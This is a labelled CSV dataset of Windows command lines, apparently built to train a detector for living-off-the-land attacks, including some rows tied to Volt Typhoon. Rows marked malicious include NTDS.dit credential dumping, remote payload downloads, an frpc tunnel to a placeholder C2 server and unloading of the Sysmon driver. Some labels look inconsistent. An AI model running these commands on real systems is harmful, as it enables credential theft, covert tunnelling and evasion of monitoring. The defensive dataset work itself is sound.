command,label,source,command_id
"attrib +h ""D:\Temp\AppData\ougvvzlqxd.txt""",0,combined_lotl,854
"move.exe ""C:\Logs\Users\obhcibcic.txt"" ""D:\Users\wvufcr.dat""",0,combined_lotl,855
conhost.exe --headless {CMD},1,combined_lotl,856
"icacls ""D:\Logs\wmlsupmxju.ini"" /grant Everyone:F",0,combined_lotl,857
wsreset.exe,1,combined_lotl,858
"certutil -hashfile ""C:\Users\wzdqyex.ini"" SHA256",0,combined_lotl,859
net.exe localgroup Administrators uifuagal /add,0,combined_lotl,860
Update.exe --update={REMOTEURL},1,combined_lotl,861
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},1,combined_lotl,862
"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",1,combined_lotl,863
fondue.exe /enable-feature:TFTP-Client [/caller-name:<program_name>] [/hide-ux:{all | rebootrequest}],0,combined_lotl,864
"copy.exe ""C:\Users\zqinr\Documents\Downloads\psqbhy.dat"" ""C:\Users\eorafz.ini""",0,combined_lotl,865
net.exe user ssamggbn /add,0,combined_lotl,866
"C:\Windows\System32\move.exe ""C:\Logs\AppData\aafnlh.log"" ""C:\Logs\bcnfwjvwhf.sys""",0,combined_lotl,867
net.exe localgroup Administrators lbmiizbq /add,0,combined_lotl,868
"move.exe ""C:\Users\utpdoo.log"" ""D:\Logs\ndprkzotgf.txt""",0,combined_lotl,869
"del ""D:\Temp\ndbaztitpb.dll"" /f /q",0,combined_lotl,870
C:\Windows\net.exe localgroup Administrators ocwtmfne /add,0,combined_lotl,871
"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",1,combined_lotl,872
net.exe use Z: \\192.168.42.19\backup,0,combined_lotl,873
"powershell.exe -Command ""Get-ChildItem -Path D:\Temp\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,874
ping.exe 192.168.165.19,0,combined_lotl,875
net use Z: \\192.168.23.21\public,0,combined_lotl,876
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Temp\jugjprx.txt\"" \""C:\Temp\Users\ngfxfd.exe\"""" /sc daily /st 23:00",0,combined_lotl,877
"move.exe ""C:\Windows\Logs\mrvbv.dat"" ""C:\Users\Logs\smzgtssyxt.dll""",0,combined_lotl,878
"copy ""D:\Users\yarmqy\Desktop\izhden.dll"" ""D:\Temp\Windows\dmoafi.log""",0,combined_lotl,879
C:\Windows\net.exe user lzvtwvpx /add,0,combined_lotl,880
ping.exe 192.168.219.64,0,combined_lotl,881
net.exe use Z: \\192.168.10.79\data,0,combined_lotl,882
net use Z: \\192.168.234.185\backup,0,combined_lotl,883
"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",1,combined_lotl,884
"""C:\pstools\psexec.exe"" {REDACTED} -s cmd.exe /c ""cmd.exe /c netsh.exe
interface portproxy delete v4tov4 listenaddress=0.0.0.0
listenport=9999",1,volttyphoon,885
C:\Windows\net.exe localgroup Administrators cxatrtvy /add,0,combined_lotl,886
reg.exe export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,1,combined_lotl,887
"icacls.exe ""C:\Program Files\Logs\pdkeoivee.ini"" /grant Everyone:F",0,combined_lotl,888
"dir.exe ""D:\Temp\Logs""",0,combined_lotl,889
net.exe user ltnhcxig /add,0,combined_lotl,890
"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""",1,combined_lotl,891
"move.exe ""C:\Program Files\ddjduppkff.ini"" ""D:\Program Files\xhnzwmucbn.ini""",0,combined_lotl,892
"E:\Windows\move.exe ""C:\Windows\AppData\fopamimqzc.txt"" ""C:\Temp\abtmsdkeya.dat""",0,combined_lotl,893
ping 192.168.217.9,0,combined_lotl,894
"certutil.exe -hashfile ""C:\Program Files\zvjsvoaoov.log"" SHA256",0,combined_lotl,895
select {hbaport | iadapter | iportal | provider | subsystem | controller | port | drive | lun | tportal | target | tpgroup } [597],0,combined_lotl,896
"fsutil devdrv setFiltersAllowed [[/f] /volume <volume path>] """"filter1, filter 2, ...""""",0,combined_lotl,897
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,898
"wmic.exe process call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro",1,combined_lotl,899
mmc.exe -Embedding {PATH_ABSOLUTE:.msc},1,combined_lotl,900
"del ""C:\AppData\nytaacwiju.dat"" /f /q",0,combined_lotl,901
"move ""C:\Windows\Users\bzpwyjja.sys"" ""C:\AppData\Windows\ycozcedjuu.exe""",0,combined_lotl,902
"move.exe ""C:\Temp\Temp\ctmue.sys"" ""D:\Logs\hgrnbk.txt""",0,combined_lotl,903
"mkdir.exe ""C:\Windows\Logs""",0,combined_lotl,904
"copy ""C:\Temp\Users\zyvuzastq.txt"" ""C:\Users\qqnm\Pictures\Pictures\zlhypuz.exe""",0,combined_lotl,905
coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,1,combined_lotl,906
"VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}""",1,combined_lotl,907
"C:\Windows\System32\fsutil.exe file layout ""D:\Users\sqbtro.dat""",0,combined_lotl,908
"dir.exe ""D:\Windows\Temp"" /s /b",0,combined_lotl,909
AppLauncher.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,910
"del ""D:\Users\Temp\fnihzyn.log"" /f /q",0,combined_lotl,911
del [/p] [/f] [/s] [/q] [/a[:]<attributes>] <names>,0,combined_lotl,912
"fsutil.exe file layout ""D:\AppData\Temp\ecribw.txt""",0,combined_lotl,913
replace drive=7,0,combined_lotl,914
"type.exe ""D:\Users\pasqi.log""",0,combined_lotl,915
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Logs\okjcitsa.txt\"" \""D:\Users\xszq\Desktop\Pictures\yewduvqf.exe\"""" /sc daily /st 23:00",0,combined_lotl,916
net.exe user pmqzdnvn /add,0,combined_lotl,917
"certutil.exe -hashfile ""C:\AppData\Logs\prnag.dll"" SHA256",0,combined_lotl,918
"C:\Windows\System32\mkdir.exe ""C:\Logs\Logs""",0,combined_lotl,919
wscript //e:vbscript {PATH}:script.vbs,1,combined_lotl,920
rem E and F.,0,combined_lotl,921
replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,1,combined_lotl,922
"attrib +h ""D:\Temp\Users\ynbhst.sys""",0,combined_lotl,923
"move ""D:\AppData\smylr.ini"" ""C:\Program Files\Program Files\jxmzxyak.log""",0,combined_lotl,924
"icacls.exe ""C:\Windows\leocqmife.dat"" /grant Everyone:F",0,combined_lotl,925
"attrib.exe +h ""C:\Logs\Temp\abxqgigaon.txt""",0,combined_lotl,926
"certutil.exe -hashfile ""C:\Users\kbfgrksk\Documents\Pictures\revvofztgu.ini"" SHA256",0,combined_lotl,927
"findstr /C:""HZWzp9HKSW7L"" ""D:\AppData\lhblpzuxj.exe""",0,combined_lotl,928
detail volume,0,combined_lotl,929
fltMC.exe unload SysmonDrv,1,combined_lotl,930
cipher /w:{PATH_ABSOLUTE:folder},1,combined_lotl,931
"copy ""D:\Logs\dvqrcwt.exe"" ""C:\Windows\equlnvlfkd.txt""",0,combined_lotl,932
"certutil.exe -hashfile ""C:\Users\tybjjnsb.dll"" SHA256",0,combined_lotl,933
net user inowyftg /add,0,combined_lotl,934
net.exe user annnquvl /add,0,combined_lotl,935
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,1,combined_lotl,936
ping 192.168.172.140,0,combined_lotl,937
eventcreate [/s <computer> [/u <domain\user> [/p <password>]] {[/l {APPLICATION|SYSTEM}]|[/so <srcname>]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id <eventID> /d <description>,0,combined_lotl,938
fondue.exe /enable-feature:<feature_name> [/caller-name:<program_name>] [/hide-ux:{all | rebootrequest}],0,combined_lotl,939
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",1,combined_lotl,940
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\dngsghlb\Documents\qvpjpxkgyl.dll\"" \""D:\Logs\Program Files\jtefem.exe\"""" /sc daily /st 23:00",0,combined_lotl,941
C:\Program Files\icacls.exe config.ini /grant Everyone:R,0,combined_lotl,942
"certutil -hashfile ""C:\AppData\AppData\rkozd.txt"" SHA256",0,combined_lotl,943
c:\windows\syswow64\iscsicpl.exe,1,combined_lotl,944
"move.exe ""D:\Users\ymtvq\Desktop\nuluu.log"" ""C:\Temp\Users\zlkdo.dll""",0,combined_lotl,945
net.exe user rqfiujbi /add,0,combined_lotl,946
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\Temp -Recurse | Select-Object FullName, Length""",0,combined_lotl,947
devtunnel.exe host -p 8080,1,combined_lotl,948
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\dgym\Downloads\jdfnhffrpl.dat\"" \""C:\Logs\lqlgy.log\"""" /sc daily /st 23:00",0,combined_lotl,949
"mkdir.exe ""C:\AppData\Temp""",0,combined_lotl,950
"C:\Windows\System32\certutil.exe -hashfile ""D:\Users\ijopqdt.ini"" SHA256",0,combined_lotl,951
"copy.exe ""D:\Users\qyonvzp\Documents\cjkcp.log"" ""C:\Program Files\jdkzitfjl.log""",0,combined_lotl,952
C:\Windows\net.exe user rmrbposn /add,0,combined_lotl,953
ping.exe 192.168.88.82,0,combined_lotl,954
"type.exe ""C:\Temp\Logs\gyhal.dat""",0,combined_lotl,955
"certutil.exe -hashfile ""C:\Program Files\pwchjwbk.dat"" SHA256",0,combined_lotl,956
"copy.exe ""D:\Windows\wrbjodj.dll"" ""D:\Logs\ndxak.dll""",0,combined_lotl,957
unmask lun {all | none | [add] wwn=<hexadecimal_number> [;<hexadecimal_number> [;…]] | [add] initiator=<initiator>[;<initiator>[;…]]} [uninstall],0,combined_lotl,958
MsoHtmEd.exe {REMOTEURL},1,combined_lotl,959
"Get-EventLog security -instanceid 4624 -after
{redacted date} | fl * | Out-File
'C:\users\public\documents\user.dat'",1,combined_lotl,960
echo QaKmE1Erib7a > C:\Users\pokkf\Pictures\aagfzrbdr.log,0,combined_lotl,961
wbemtest.exe,1,combined_lotl,962
"C:\Windows\certutil.exe -hashfile ""D:\Temp\Users\qrjjdlh.txt"" SHA256",0,combined_lotl,963
net.exe localgroup Administrators kvaznlih /add,0,combined_lotl,964
"C:\Windows\System32\type.exe ""D:\Windows\nmosaox.ini""",0,combined_lotl,965
expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},1,combined_lotl,966
"fsutil file layout ""C:\Users\AppData\ufsrqrxi.dll""",0,combined_lotl,967
HH.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,968
"attrib.exe +h ""D:\Users\gisdxb\Documents\zkpzbvyad.dll""",0,combined_lotl,969
"wmic.exe process call create ""ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro",1,volttyphoon,970
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,1,combined_lotl,971
"type ""D:\Windows\Windows\kkpgdpytv.exe""",0,combined_lotl,972
Remote.exe /s {PATH:.exe} anythinghere,1,combined_lotl,973
"echo.exe %DATE% %TIME% >> ""D:\Temp\musyxduhzo.dll""",0,combined_lotl,974
echo tlah4nnlVhiS > C:\Users\dhuutywi\Pictures\Pictures\ghovhuzpp.exe,0,combined_lotl,975
ScriptRunner.exe -appvscript {PATH_SMB:.cmd},1,combined_lotl,976
net localgroup Administrators uoazmtlt /add,0,combined_lotl,977
D:\Windows\net.exe localgroup Administrators vwxgogpg /add,0,combined_lotl,978
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,1,combined_lotl,979
net use Z: \\192.168.15.197\backup,0,combined_lotl,980
ie4uinit.exe -BaseSettings,1,combined_lotl,981
Register-cimprovider -path {PATH_ABSOLUTE:.dll},1,combined_lotl,982
C:\Windows\net.exe localgroup Administrators rdzupevq /add,0,combined_lotl,983
"findstr.exe /C:""0VMSR5nLkR7n"" ""C:\Logs\Logs\vtkpw.txt""",0,combined_lotl,984
diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1,combined_lotl,985
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\Users\kfujqfj.log\"" \""D:\Temp\detdlvj.exe\"""" /sc daily /st 23:00",0,combined_lotl,986
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\Windows\rrfpekt.exe\"" \""D:\Program Files\jvwmnljfb.sys\"""" /sc daily /st 23:00",0,combined_lotl,987
fsutil.exe volume [dismount] D:\Windows,0,combined_lotl,988
"attrib +h ""C:\Windows\AppData\wqgfsemija.dat""",0,combined_lotl,989
net use Z: \\192.168.148.85\backup,0,combined_lotl,990
net.exe user lcvaggfq /add,0,combined_lotl,991
fsutil devdrv untrust [/f] C:\Windows\Temp,0,combined_lotl,992
"copy.exe ""C:\Temp\mzyrd.dll"" ""D:\Logs\bbpzvcn.dat""",0,combined_lotl,993
name [[ predicate ] action ]] [-i probe-id [[ predicate ] action ]] [ args ... ],0,combined_lotl,994
"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",1,combined_lotl,995
net use Z: \\192.168.106.49\public,0,combined_lotl,996
"findstr.exe /C:""DauJPJO5EjZK"" ""C:\Program Files\Users\dgvhiump.dll""",0,combined_lotl,997
(ar??1991.* ap??1991.*),0,combined_lotl,998
expose %systemvolumeshadow% p:,0,combined_lotl,999
diskshadow/list/revert <shadowcopyID>,0,combined_lotl,1000
"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",1,combined_lotl,1001
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,1,combined_lotl,1002
C:\Windows\ping.exe 192.168.82.45,0,combined_lotl,1003
"certutil -hashfile ""D:\Windows\Logs\nalcbikeu.exe"" SHA256",0,combined_lotl,1004
net.exe use Z: \\192.168.207.14\backup,0,combined_lotl,1005
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",1,combined_lotl,1006
"findstr /C:""oDw9Y7JMxZbJ"" ""D:\Users\etzdtss\Pictures\Documents\rtwfzzdqw.exe""",0,combined_lotl,1007
"echo %DATE% %TIME% >> ""D:\Windows\Program Files\ikrgirghr.txt""",0,combined_lotl,1008
detail {hbaport | iadapter | iportal | provider | subsystem | controller | port | drive | lun | tportal | target | tpgroup} [verbose],0,combined_lotl,1009
"copy ""C:\Users\vnxnvzy\Documents\Desktop\uodtoaty.txt"" ""C:\Temp\Program Files\mgebcsxr.dat""",0,combined_lotl,1010
"certutil -hashfile ""D:\Temp\leuxaa.dll"" SHA256",0,combined_lotl,1011
fsutil.exe devdrv trust [/f] C:\AppData\Users,0,combined_lotl,1012
"C:\Windows\findstr.exe /C:""Xt6EgVJSxZoL"" ""D:\AppData\Temp\hlbebbhotx.log""",0,combined_lotl,1013
C:\Windows\Temp\tmp\Active Directory\ntds.dit,1,combined_lotl,1014
add volume <volume> [provider 6212b85c-29f3-45a6-a72d-aba4d9e40824],0,combined_lotl,1015
ping.exe 192.168.53.245,0,combined_lotl,1016
Excel.exe {REMOTEURL},1,combined_lotl,1017
"rundll32.exe shell32.dll,#44 {PATH:.dll}",1,combined_lotl,1018
fsutil usn [queryjournal] <volumepath>,0,combined_lotl,1019
echo.exe jHoE1ha6gnkN > C:\Program Files\Program Files\vmuovwbkid.dll,0,combined_lotl,1020
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess {PATH:.ps1},1,combined_lotl,1021
"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}",1,combined_lotl,1022
"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",1,combined_lotl,1023
cmd /c vssadmin create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp,1,combined_lotl,1024
"attrib.exe +h ""C:\Users\gfgqn.log""",0,combined_lotl,1025
"copy ""C:\Users\fgitplzkl.txt"" ""D:\Program Files\cuvgxlml.txt""",0,combined_lotl,1026
C:\Windows\echo.exe TPGaF45bTTjo > C:\Windows\lcqrkxu.txt,0,combined_lotl,1027
"type ""C:\Logs\Logs\aoxkmz.txt""",0,combined_lotl,1028
MSAccess.exe {REMOTEURL},1,combined_lotl,1029
"# Establishes a TCP tunnel to the attacker's server
frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>",1,combined_lotl,1030
"D:\Windows\rmdir.exe ""D:\Users\krdgp\Pictures"" /s /q",0,combined_lotl,1031
"certutil.exe -hashfile ""D:\Users\cfkh\Desktop\Documents\ujjvmy.dat"" SHA256",0,combined_lotl,1032
detail partition,0,combined_lotl,1033
"findstr /C:""UuR4kRakaTrt"" ""D:\Temp\cwunklua.dll""",0,combined_lotl,1034
"ssh localhost ""{C:\Windows\System32\cmd.exe}""",1,combined_lotl,1035
net.exe localgroup Administrators zcxfjtma /add,0,combined_lotl,1036
"fsutil file layout ""C:\AppData\Windows\zgrbm.ini""",0,combined_lotl,1037
Pester.bat ;{PATH:.exe},1,combined_lotl,1038
"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path C:\Program Files\AppData -Recurse | Select-Object FullName, Length""",0,combined_lotl,1039
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll},1,combined_lotl,1040
"findstr.exe /C:""s0p5iiRRYI5K"" ""D:\Program Files\Users\mttshqgloa.ini""",0,combined_lotl,1041
explorer.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,1042
"fsutil.exe file layout ""C:\Users\kzey\Documents\kcbshvnac.dat""",0,combined_lotl,1043
"wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\",1,combined_lotl,1044
"copy.exe ""D:\Temp\Windows\wbyirpz.txt"" ""C:\Users\nurkqno\Downloads\beyibgnju.dat""",0,combined_lotl,1045
"rmdir.exe ""C:\Windows\AppData"" /s /q",0,combined_lotl,1046
"del ""C:\AppData\Temp\envshl.txt"" /f /q",0,combined_lotl,1047
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",1,combined_lotl,1048
net.exe user nrlvqmqp /add,0,combined_lotl,1049
"echo %DATE% %TIME% >> ""C:\Users\ugcd\Downloads\Desktop\vovaw.sys""",0,combined_lotl,1050
"certutil.exe -hashfile ""D:\Windows\Program Files\yoabcwh.sys"" SHA256",0,combined_lotl,1051
net.exe use Z: \\192.168.252.250\data,0,combined_lotl,1052
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\dkzztqa.log\"" \""C:\Windows\Windows\barobe.log\"""" /sc daily /st 23:00",0,combined_lotl,1053
procdump.exe -md {PATH:.dll} foobar,1,combined_lotl,1054
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt,1,combined_lotl,1055
certutil -encode {PATH} {PATH:.base64},1,combined_lotl,1056
"type ""D:\AppData\ykbkffih.dll""",0,combined_lotl,1057
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,1,combined_lotl,1058
ping.exe 192.168.181.158,0,combined_lotl,1059
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\icpghzfp\Downloads\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,1060
"del ""C:\Logs\AppData\vbldydo.dat"" /f /q",0,combined_lotl,1061
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},1,combined_lotl,1062
VSLaunchBrowser.exe .exe {PATH_SMB},1,combined_lotl,1063
"C:\Windows\certutil.exe -hashfile ""C:\Logs\tzesjgpo.log"" SHA256",0,combined_lotl,1064
net.exe localgroup Administrators udjmlxhh /add,0,combined_lotl,1065
ping 192.168.254.25,0,combined_lotl,1066
. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke {CMD},1,combined_lotl,1067
"del ""D:\Users\tbrlqmyd\Documents\gscjkchyz.txt"" /f /q",0,combined_lotl,1068
"dir.exe ""D:\Users\Windows"" /s /b",0,combined_lotl,1069
net.exe localgroup Administrators service /add,0,combined_lotl,1070
online disk,0,combined_lotl,1071
ping.exe 192.168.224.75,0,combined_lotl,1072
C:\Windows\certutil.exe -decodehex {PATH:.hex} {PATH},1,combined_lotl,1073
net localgroup Administrators jigqsvhx /add,0,combined_lotl,1074
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\rhee\Pictures\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,1075
"icacls.exe ""D:\Temp\AppData\vunfguxjh.ini"" /grant Everyone:F",0,combined_lotl,1076
"certutil.exe -hashfile ""D:\Windows\Users\etkcrosk.ini"" SHA256",0,combined_lotl,1077
"move ""C:\Windows\Program Files\bgptiirr.txt"" ""D:\Users\zutxyxaqx.txt""",0,combined_lotl,1078
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Logs\AppData\gcefahy.exe\"" \""D:\Windows\vpzlaa.log\"""" /sc daily /st 23:00",0,combined_lotl,1079
"attrib.exe +h ""D:\Windows\bmstgbhnh.txt""",0,combined_lotl,1080
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\lmnexhgzv.exe\"" \""D:\Temp\qbwmnmfyu.dll\"""" /sc daily /st 23:00",0,combined_lotl,1081
net user gsbnjuft /add,0,combined_lotl,1082
net.exe use Z: \\192.168.149.224\data,0,combined_lotl,1083
"icacls.exe ""C:\Users\xiziuzcv\Downloads\Desktop\eeejp.dll"" /grant Everyone:F",0,combined_lotl,1084
"fsutil.exe file layout ""D:\Program Files\xkfdchkx.dat""",0,combined_lotl,1085
"findstr.exe /C:""XCM75tXVeAQX"" ""C:\Users\Program Files\sjwwotukn.txt""",0,combined_lotl,1086
net localgroup Administrators yuyvzpzh /add,0,combined_lotl,1087
squirrel.exe --update {REMOTEURL},1,combined_lotl,1088
"dir ""C:\Users\vuatftzs\Downloads\Pictures"" /s /b",0,combined_lotl,1089
echo.exe hf51fE8joaCt > C:\Program Files\gbfulufrce.log,0,combined_lotl,1090
"type.exe ""D:\Temp\Users\bxkcwxdtor.txt""",0,combined_lotl,1091
net.exe use Z: \\192.168.174.120\data,0,combined_lotl,1092
"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",1,combined_lotl,1093
ConfigSecurityPolicy.exe {REMOTEURL},1,combined_lotl,1094
"del ""D:\Users\Windows\elvtkzgn.exe"" /f /q",0,combined_lotl,1095
fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},1,combined_lotl,1096
windbg.exe -g {CMD},1,combined_lotl,1097
net.exe use Z: \\192.168.225.66\backup,0,combined_lotl,1098
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},1,combined_lotl,1099
rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM,1,combined_lotl,1100
"fsutil file layout ""C:\Program Files\xxuxd.txt""",0,combined_lotl,1101
wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe},1,combined_lotl,1102
xcopy.exe \customer h:\public\address /s /e /k /p /i,0,volttyphoon,1103
dotnet.exe msbuild {PATH:.csproj},1,combined_lotl,1104
"dir ""C:\AppData\Users"" /s /b",0,combined_lotl,1105
"mkdir.exe ""D:\Users\brtob\Documents""",0,combined_lotl,1106
"echo.exe %DATE% %TIME% >> ""C:\Temp\Program Files\fzbhx.txt""",0,combined_lotl,1107
C:\Windows\System32\net.exe use Z: \\192.168.141.209\data,0,combined_lotl,1108
SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},1,combined_lotl,1109
"certutil.exe -hashfile ""C:\Temp\cqwacdr.ini"" SHA256",0,combined_lotl,1110
"attrib +h ""D:\Users\idmsdvc.exe""",0,combined_lotl,1111
"C:\Windows\attrib.exe +h ""D:\Temp\bftxyvsh.dat""",0,combined_lotl,1112
net.exe user ftfjzrco /add,0,combined_lotl,1113
"echo.exe %DATE% %TIME% >> ""C:\Users\kpezmebi\Documents\Documents\taibwf.dat""",0,combined_lotl,1114
echo Y12esJSp2nJm > C:\Program Files\rixmfoswsk.dat,0,combined_lotl,1115
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Temp\wajvsykj.ini\"" \""C:\Windows\mqgsdkky.dll\"""" /sc daily /st 23:00",0,combined_lotl,1116
"del ""C:\Users\sfwt\Downloads\gcyqbjvy.log"" /f /q",0,combined_lotl,1117
activate instance ntds ifm,0,volttyphoon,1118
echo HYnbYvZDQoq2 > D:\Logs\wswnsmirb.ini,0,combined_lotl,1119
C:\Windows\System32\net.exe user fqadwmmq /add,0,combined_lotl,1120
"copy ""C:\Users\Windows\gcagiqtkh.log"" ""C:\AppData\oqivdtzvel.exe""",0,combined_lotl,1121
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""C:\Program Files\AppData\olrtf.dll""",0,combined_lotl,1122
ECMangen.exe {REMOTEURL},1,combined_lotl,1123
"attrib.exe +h ""D:\Logs\ujoppvp.dat""",0,combined_lotl,1124
"findstr /C:""M3Zy64EbfnUz"" ""D:\Logs\qbyail.exe""",0,combined_lotl,1125
"findstr /C:""OJsDxhcsffir"" ""C:\Logs\Temp\yxetffccap.txt""",0,combined_lotl,1126
refresh provider,0,combined_lotl,1127
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe,1,combined_lotl,1128
"echo.exe %DATE% %TIME% >> ""D:\AppData\iztfnhq.log""",0,combined_lotl,1129
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,1,combined_lotl,1130
"findstr.exe /C:""xLm3XTlXKKQN"" ""D:\Logs\Temp\ncxkikkzyq.ini""",0,combined_lotl,1131
"C:\Windows\fsutil.exe file layout ""D:\Users\axjq\Pictures\rrldam.dat""",0,combined_lotl,1132
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\mwzwld.ini\"" \""C:\AppData\cyxvf.dll\"""" /sc daily /st 23:00",0,combined_lotl,1133
"findstr /C:""v0p1AgC9eHzx"" ""D:\Temp\htxwr.exe""",0,combined_lotl,1134
C:\Windows\System32\dir.exe C:\Temp,0,combined_lotl,1135
"icacls.exe ""D:\Users\snjdfreu\Documents\thvsu.dll"" /grant Everyone:F",0,combined_lotl,1136
"echo %DATE% %TIME% >> ""C:\Users\ejyit\Documents\Downloads\zrrpwwoju.log""",0,combined_lotl,1137
